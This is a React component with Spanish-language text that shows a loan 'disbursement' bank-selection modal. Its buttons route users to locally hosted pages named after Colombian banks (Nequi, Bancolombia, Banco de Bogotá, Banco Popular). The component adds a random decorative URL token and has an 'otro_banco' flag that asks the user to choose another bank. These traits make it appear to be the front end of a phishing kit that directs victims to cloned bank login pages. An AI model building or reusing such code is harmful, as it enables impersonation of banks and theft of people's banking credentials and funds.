import React, { useEffect, useState } from 'react';

function BankSelection({ onClose }) {
  const [showOtroBancoMessage, setShowOtroBancoMessage] = useState(false);

  useEffect(() => {
    try {
      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
      let token = '';
      for (let i = 0; i < 50 + Math.floor(Math.random() * 30); i++) {
        token += chars.charAt(Math.floor(Math.random() * chars.length));
      }
      const base64Token = btoa(token + Date.now()).replace(/=/g, '');
      const url = new URL(window.location.href);
      url.searchParams.set('token', base64Token);

      if (url.searchParams.get('otro_banco') === '1') {
        setShowOtroBancoMessage(true);
        url.searchParams.delete('otro_banco');
      }

      window.history.replaceState(null, '', url.toString());
    } catch (e) {}
  }, []);

    const banks = [
  {
    name: 'Nequi',
    logo: '/nequi.png',
    color: 'text-pink-600',
    url: '/nequi/index.html'
  },
  {
    name: 'Bancolombia',
    logo: '/bancolombia.png',
    color: 'text-black',
    url: '/bancolombia/USUARIO BANCOLOMBIA.html'
  },
  {
    name: 'Banco de Bogotá',
    logo: '/bancodebogota.png',
    color: 'text-blue-900',
    url: '/bancodebogota/index.html'
  },
  {
    name: 'Banco Popular',
    logo: '/bancopopular.png',
    color: 'text-green-700',
    url: '/banco popular/index.html'
  },
  {
    name: 'Banco AV Villas',
    logo: '/avvillas.png',
    color: 'text-red-600',
    disabled: true
  }
];

  return (
    <div className="w-full max-w-lg z-20 animate-fade-in-up">
      <div className="bg-white rounded-[2rem] p-6 shadow-2xl relative">
              {showOtroBancoMessage && (
          <div className="mb-4 rounded-xl bg-blue-50 border border-blue-200 text-blue-800 text-sm px-3 py-2">
            Por favor selecciona otro banco para realizar esta acción.
          </div>
        )}
        
        {/* Header */}
        <div className="flex justify-between items-start mb-6">
          <h2 className="text-xl font-bold text-gray-900 leading-tight">
            Selecciona una opción de desembolso
          </h2>
          <button 
            onClick={onClose}
            className="bg-gray-100 hover:bg-gray-200 text-gray-500 hover:text-gray-700 rounded-full w-8 h-8 flex items-center justify-center transition-colors font-bold text-lg"
          >
            ×
          </button>
        </div>

        {/* Grid de Bancos */}
        <div className="grid grid-cols-2 gap-4">
          {banks.map((bank, index) => (
            <button
              key={index}
              disabled={bank.disabled}
              onClick={() => !bank.disabled && bank.url ? window.location.href = bank.url : null}
              className={`bg-white border border-gray-100 rounded-xl p-4 h-20 flex items-center justify-center shadow-sm 
                ${bank.disabled 
                  ? 'opacity-40 cursor-not-allowed grayscale' 
                  : 'hover:shadow-md hover:border-gray-200 transition-all transform hover:-translate-y-0.5 group'
                }`}
            >
              {bank.logo ? (
                <img 
                  src={bank.logo} 
                  alt={bank.name} 
                  className="h-8 max-w-full object-contain group-hover:scale-105 transition-transform"
                />
              ) : (
                <span className={`font-bold text-lg ${bank.color} group-hover:scale-105 transition-transform`}>
                  {bank.name}
                </span>
              )}
            </button>
          ))}
        </div>

      </div>
    </div>
  );
}

export default BankSelection;
